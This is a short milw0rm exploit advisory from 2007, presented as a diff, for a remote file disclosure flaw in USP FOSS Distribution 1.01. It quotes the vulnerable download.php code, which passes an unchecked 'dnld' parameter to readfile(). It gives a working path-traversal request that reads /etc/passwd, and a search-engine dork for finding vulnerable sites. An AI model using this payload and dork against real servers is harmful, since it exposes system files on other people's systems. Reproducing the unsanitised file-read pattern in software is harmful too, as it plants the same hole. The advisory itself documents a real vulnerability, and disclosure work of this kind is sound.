@@ -1,0 +1,20 @@
+# USP FOSS Distribution 1.01(download.php dnld)Remote File Disclosure
+# D.Script: http://norcalvex.org/pagode/uspfoss_v1_01.zip
+# Discovered by: GolD_M = [Mahmood_ali]
+# Homepage: http://www.Tryag.cc
+# Dork:intitle:USP FOSS Distribution
+# V.Code In /user/download.php:
+###################/user/download.php###################
+#  <?
+#  $file = @$_GET['dnld'];<----[+]
+#  header('Content-Description: File Transfer');
+#  header('Content-Type: application/force-download');
+#  header('Content-Length: ' . filesize($file));
+#  header('Content-Disposition: attachment; filename=' . basename($file));
+#  readfile($file); <----[+]
+#  ?>
+########################################################
+# Exploit:[Path_USP FOSS]/user/download.php?dnld=../../../../../../etc/passwd
+# Greetz To: Tryag-Team & 4lKaSrGoLd3n-Team & AsbMay's Group & bd0rk
+
+# milw0rm.com [2007-04-24]
